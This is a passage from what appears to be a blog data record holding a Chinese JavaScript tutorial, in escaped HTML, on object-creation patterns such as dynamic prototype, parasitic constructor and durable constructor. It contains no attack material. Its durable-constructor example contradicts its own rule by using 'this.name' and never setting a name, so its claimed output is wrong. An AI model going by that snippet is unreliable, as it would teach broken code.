style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">false</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style=\"color: rgb(0, 128, 255);\">constructor</span>和方法<span style=\"color: rgb(0, 128, 255);\">sayName()</span>则是在原型中定义的。所以修改了<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>并不会改变<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>五、动态原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>]; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//注意if语句</span></span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">if</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">typeof</span> <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.sayName!=<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"function\"</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>);\nperson1.sayName();</span></code></pre></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符来确定他的类型。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><strong><span style=\"color: rgb(247, 92, 47);\">六、寄生构造函数模式</span></strong></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;\n &nbsp; &nbsp;<br>&nbsp; o.job = job;\n &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br>&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"> &nbsp; &nbsp; &nbsp;return</span> o;\n}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"banzhuan\"</span>);\nperson.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//\"wei\"</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style=\"color: rgb(0, 128, 255);\">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">SpecialArray</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"><br> &nbsp; &nbsp;//创建数组</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br> &nbsp; &nbsp;var</span> values = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>\n &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.join(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"|\"</span>);<br>} &nbsp; &nbsp;<br> <br> <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">&nbsp; &nbsp;//返回数组</span><br> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp;return</span> values;<br> }<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> colors = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> SpecialArray(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"red\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"blue\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"green\"</span>);<br>console.log(colors.toPipedString());<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//red|blue|green</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style=\"color: rgb(0, 128, 255);\">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>七、稳妥构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style=\"color: rgb(247, 92, 47);\"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数重写如下：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>(); <br> &nbsp;<br><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//返回对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法之外，没有其他办法访问<span style=\"color: rgb(0, 128, 255);\">name</span>的值。可以像下面使用稳妥的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person =Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"weiqi\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">22</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"banzhuan\"</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//weiqi</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style=\"color: rgb(0, 128, 255);\">person</span>中保存的是一个稳妥对象，而除了<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(247, 92, 47);\"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p>\n \n>转自：http://blog.csdn.net/u014346301/article/details/52204967","slug":"JavaScript创建对象的七种模式","published":1,"updated":"2016-10-11T12:19:24.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiskco002e3sonlbfgij73","content":"<p><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style=\"color: rgb(0, 128, 255);\">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102);\">Object</span>();、</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.name = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">“liubei”</span>;</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.age = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 102, 102);\">29</span>;<br>person.job = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">“shayemuyou”</span>;<br><br>person.sayName = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 12px; color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp;<br>&nbsp; alert(<span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style=\"color: rgb(0, 128, 255);\">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法用于显示name属性，<span style=\"color: rgb(0, 128, 255);\">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = {<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class=\"\" style=\"color: rgb(0, 136, 0);\">“liubei”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;age:<span class=\"\" style=\"color: rgb(0, 102, 102);\">29</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class=\"\" style=\"color: rgb(0, 136, 0);\">“shayemuyou”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style=\"color: rgb(0, 128, 255);\">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style=\"color: rgb(0, 128, 255);\">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47); font-size: 14px;\"><strong><span style=\"color: rgb(247, 92, 47);\">一、工厂模式</span></strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 